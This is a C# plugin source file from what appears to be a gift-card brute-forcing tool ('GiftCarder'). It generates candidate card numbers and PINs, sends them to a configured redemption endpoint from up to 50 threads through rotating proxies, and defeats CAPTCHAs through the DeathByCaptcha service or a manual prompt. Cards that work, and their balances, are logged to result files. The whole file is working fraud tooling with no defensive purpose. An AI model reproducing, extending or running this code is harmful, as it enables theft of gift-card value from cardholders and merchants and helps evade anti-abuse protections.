 using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using BruteEngine;
using DeathByCaptcha;
using xNet;

namespace GiftCarder.Plugins
{
	class Container : IPlugin
	{
		public Container(PSettings settings)
		{
			IsWorked = false;
			debug = false;
			 r = new Random();
			_pSettings = settings;
			if (settings.Captcha.Contains("true"))
			{
				if(settings.DeathByCaptchaAccount.Contains(":"))
				try
				{
					sc = new SocketClient(settings.DeathByCaptchaAccount.Split(':')[0], settings.DeathByCaptchaAccount.Split(':')[1]);
					Console.WriteLine($"Balance: {sc.Balance}");
				}
				catch
				{
					Console.WriteLine($"DeathByCaptcha: Account is bad");
				}
			
				
			}
			o =new object();
		}

		private SocketClient sc;
		private PSettings _pSettings;
		private Thread[] _threads;
		private string[] Proxy;
		private object o;
		private bool debug = false;

		private void Debug(string s)
		{
			if (debug)
			Console.WriteLine("Debug: "+s);
		}
		public void Check()
		{
			while (IsWorked && Program.IsT)
			{
				try
				{
					string card = "";
					
					if (Signature.Contains("*"))
					{
						foreach (var VARIABLE in Signature)
						{
							if (VARIABLE == '*')
								card += r.Next(0, 10).ToString();
							else
								card += VARIABLE;
						}
					}
					else
					{
						for (int i = 0; i < Signature.Length; i++)
						{
							if (i > Signature.Length - _pSettings.LastSymReplace)
								card += _pSettings.CardDictionary[r.Next(0, _pSettings.CardDictionary.Length)].ToString();
							else
								card += Signature[i];
						}
					}
					if(cards.Contains(card))
						continue;
					Debug("Card: "+card);
					try
					{
						using (HttpRequest rq = new HttpRequest())
						{
							rq.KeepAlive = true;

							rq.IgnoreProtocolErrors = true;
							if (_pSettings.UseProxy.Contains("true"))
								rq.Proxy = ProxyClient.Parse(pType, Proxy[r.Next(Proxy.Length)]);
							rq.UserAgent =
								"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36 OPR/46.0.2597.32";
							string ct = "application/x-www-form-urlencoded";
							Debug("Headers: " + _pSettings.Headers.Count);

							foreach (var header in _pSettings.Headers)
							{
								try
								{
									Debug("Header: " + header.Key+": " + header.Value);
									if (header.Key.Contains("content-type"))
										ct = header.Value;
									else
									if (header.Key.Contains("UserAgent"))
										rq.UserAgent = header.Value;
									else
										rq.AddHeader(header.Key, header.Value);
									
								}
								catch
								{
								}
							}

							if (_pSettings.ModuleType != "Token")
							{
								Debug("Type: Simple" );
								string s, cap = "";
								if (_pSettings.Captcha.Contains("true"))
								{
									Debug("Captcha: true" );
									if (sc != null)
										cap = sc.Upload(rq.Get(_pSettings.CaptchaUrl).ToBytes()).Text;
									else
									{
										
										Console.WriteLine("Error: Captcha settings incorrect");
										continue;
									}
									Debug("Captcha: "+cap);
								}
								Debug("pin: " + _pSettings.Pin);
								int pinLength=1;
								if(_pSettings.Pin.Length>2)
									pinLength = int.Parse(_pSettings.Pin);
								for (int i = 0; i < pinLength; i++)
								{
									string pin = GetPin(i);
									if(pinLength>1 )
										Debug("pin: " + pin);
									if (_pSettings.UrlMethod.ToLower() == "post")
									{
										Debug("Request: post");
										s = rq.Post(_pSettings.Url.Replace("{card}", card).Replace("{pin}", pin),
												_pSettings.UrlData.Replace("{card}", card).Replace("{captcha}", cap).Replace("{pin}", pin), ct)
											.ToString();
										Debug(s);
									}
									else
									{
										Debug("Request: get");

										s = rq.Get(_pSettings.Url.Replace("{card}", card).Replace("{pin}", pin).Replace("{captcha}", cap)).ToString();
										Debug(s);
									}

									if (GetBoolean(s, _pSettings.Bad))
									{
										Debug($"Bad");

										Bad++;
										continue;
									}
									if (GetBoolean(s, _pSettings.Good))
									{
										Debug($"good");
										if (_pSettings.ParseBalance != "")
										{
											Debug($"Balance parse: {_pSettings.ParseBalance}");
											string[] pars = _pSettings.ParseBalance.Split('|');
											string bal = s.Substring(pars[0], pars[1], 0);
											Debug($"Balance: {bal}");
											lock (o)
											{
												cards += card;
												   Good++;
												File.AppendAllText($"Result\\Good-{_pSettings.Name}.txt", $"[{card}] holds: ${bal}\r\n");
												Console.ForegroundColor = ConsoleColor.Green;
												Console.WriteLine($"{Good}) [{card}] holds: ${bal}");
											}
										}
										else
										{
											
											lock (o)
											{
												cards += card;
												Good++;
												File.AppendAllText($"Result\\Good-{_pSettings.Name}.txt", $"[{card}]\r\n");
												Console.ForegroundColor = ConsoleColor.Green;
												Console.WriteLine($"{Good}) [{card}]");
											}
										}
										Debug($"error");
										break;
									}
								}
							}
							else
							{
								rq.Cookies = new CookieDictionary();
								string s, cap = "";

								Debug($"Type: Token");
								if (_pSettings.UrlTokMethod.ToLower() == "post")
								{
									Debug($"Token post: {_pSettings.UrlTok}");
									s = rq.Post(_pSettings.UrlTok, _pSettings.UrlTokData, ct).ToString();
									Debug($"{s}");
								}
								else
								{
									Debug($"Token get: {_pSettings.UrlTok}");
									s = rq.Get(_pSettings.UrlTok).ToString();
									Debug($"{s}");
								}
								string data = _pSettings.UrlData;
								Debug($"data: {data}");
								string capUrl = _pSettings.CaptchaUrl;
								foreach (var tok in _pSettings.Tokens)
								{
									Debug($"Tok: {tok.Key}: {tok.Value}");
									string t = "";
									if (tok.Key.Contains("Cookie"))
									{
										rq.Cookies.TryGetValue(tok.Key, out t);
									}
									else
									{
										string[] lf = tok.Value.Split('|');
										t = s.Substring(lf[0], lf[1]);
										Debug($"Tok: {t}");
									}
									if (!string.IsNullOrEmpty(t))
									{
										capUrl = _pSettings.UrlData.Replace("{" + tok.Key + "}", t);
										data = _pSettings.UrlData.Replace("{" + tok.Key + "}", t);
										//Tokens.Add(tok.Key, t);
									}
									else
									{
										Console.WriteLine("Error: Token not found > Error");
									}
								}
								Debug($"data: {data}");
								if (_pSettings.Captcha.Contains("true"))
								{
									Debug($"Captcha: true");
									if (sc != null)
										cap = sc.Upload(rq.Get(capUrl).ToBytes()).Text;
									else
										lock (o)
										{
											CaptchaForm cf = new CaptchaForm(new MemoryStream(rq.Get(_pSettings.CaptchaUrl).ToBytes()));
											cf.ShowDialog();
											cap = cf.textBox1.Text;
										}
									Debug($"Captcha: {cap}");
								}

								rq.Referer = _pSettings.UrlTok;
								int pinLength = 1;
								if (_pSettings.Pin.Length > 2)
									pinLength = int.Parse(_pSettings.Pin);
								for (int i = 0; i < pinLength; i++)
								{
									if(pinLength>1)
									Debug($"Pin: {_pSettings.Pin}");
									string pin = GetPin(i);
									if (pinLength>1)
									Debug($"Pin: {pin}");
									if (_pSettings.UrlMethod.ToLower() == "post")
									{
										Debug($"Request post: {_pSettings.Url.Replace("{card}", card).Replace("{pin}", pin)}");
										s = rq.Post(_pSettings.Url.Replace("{card}", card).Replace("{pin}", pin),
												data.Replace("{card}", card).Replace("{pin}", pin).Replace("{captcha}", cap),
												ct)
											.ToString();
										Debug(s);
									}
									else
									{
										Debug($"Request get: {_pSettings.Url.Replace("{card}", card).Replace("{pin}", pin).Replace("{captcha}", cap)}");
										s = rq.Get(_pSettings.Url.Replace("{card}", card).Replace("{pin}", pin).Replace("{captcha}", cap)).ToString();
										Debug(s);
									}
									if (GetBoolean(s, _pSettings.Bad))
									{
										Debug($"Bad");
										Bad++;
										continue;
									}
									if (GetBoolean(s, _pSettings.Good))
									{
										Debug($"Good");
										if (_pSettings.ParseBalance != "")
										{
											Debug($"ParseBalance: {_pSettings.ParseBalance}");
											string[] pars = _pSettings.ParseBalance.Split('|');
											string bal = s.Substring(pars[0], pars[1], 0);
											Debug($"Balance: {bal}");
											lock (o)
											{
												cards += card;
												Good++;
												File.AppendAllText($"Result\\Good-{_pSettings.Name}.txt", $"[{card}] holds: ${bal}\r\n");
												Console.WriteLine($"{Good}) [{card}] holds: ${bal}");
											}
											Console.ForegroundColor = ConsoleColor.Green;
										
										}
										else
										{
											Debug($"Bad");
											lock (o)
											{
												cards += card;
												Good++;
												File.AppendAllText($"Result\\Good-{_pSettings.Name}.txt", $"[{card}]\r\n");
												Console.ForegroundColor = ConsoleColor.Green;
												Console.WriteLine($"{Good}) [{card}]");
											}
										}
										Debug($"error");
										break;
									}
								}
							}
						}
					}
					catch (System.Exception ee)
					{
						Console.WriteLine("Error 245: "+ee.Message);
					}

				}
				catch
				{

				}
			}
		}

		private string GetPin(int pin)
		{
			string p = pin.ToString();
			if(_pSettings.Pin.Length!=0)
			while (p.Length != _pSettings.Pin.Length)
			{
				p = "0" + p;
			}
			return p;
		}
		private bool GetBoolean(string s, string boo)
		{
			if (boo.Contains("|"))
			{
				var boos = boo.Split('|');
				foreach (var b in boos)
				{
					Debug($"{b} | ");
					if (s.Contains(b))
					{
						return true;
					}
				}
				return false;
			}
			if (boo.Contains("&"))
			{
				var boos = boo.Split('&');
				foreach (var b in boos)
				{
					Debug($"{b} & ");

					if (!s.Contains(b))
					{
						return false;
					}
				}
				return true;
			}
			return s.Contains(boo);
		}

		public string GetStats()
		{
			return $"{Good}/{Bad}";
		}
		public PSettings GetSettings()
		{
			return _pSettings;
		}
		public bool IsWorked { get; private set; }
		public int Good { get; private set; }
		public int Bad { get; private set; }
		private string Signature;
		private ProxyType pType;
		private string cards = "";
		public void Start(int count, string s)
		{
			if (count > 50)
				count = 50;
			if (!IsWorked)
			{
				Directory.CreateDirectory("Result");
				Signature = s;
				if (_pSettings.UseProxy.Contains("true"))
				{
					OpenFileDialog openFileDialog = new OpenFileDialog
					{
						Filter = "http(s)|*.txt|socks(4)|*.txt|socks(5)|*.txt"
					};
					bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
					if (flag)
					{
						Proxy = File.ReadAllLines(openFileDialog.FileName);
						Console.WriteLine($"Loaded {Proxy.Length} proxies");
						if (openFileDialog.FilterIndex == 1)
							pType = ProxyType.Http;
						if (openFileDialog.FilterIndex == 2)
							pType = ProxyType.Socks4;
						if (openFileDialog.FilterIndex == 2)
							pType = ProxyType.Socks5;
					}
					else
					{
						return;
					}



				}
				_threads = new Thread[count];
				IsWorked = true;
				for (int i = 0; i < count; i++)
				{
					_threads[i] = new Thread(Check) { IsBackground = true };
					_threads[i].Start();
				}

			}
		}
		public void Stop()
		{
			foreach (var VARIABLE in _threads)
			{
				VARIABLE.Abort();
			}
			IsWorked = false;
		}

		public string GetName()
		{
			return _pSettings.Name;
		}

		private Random r;
	}
}
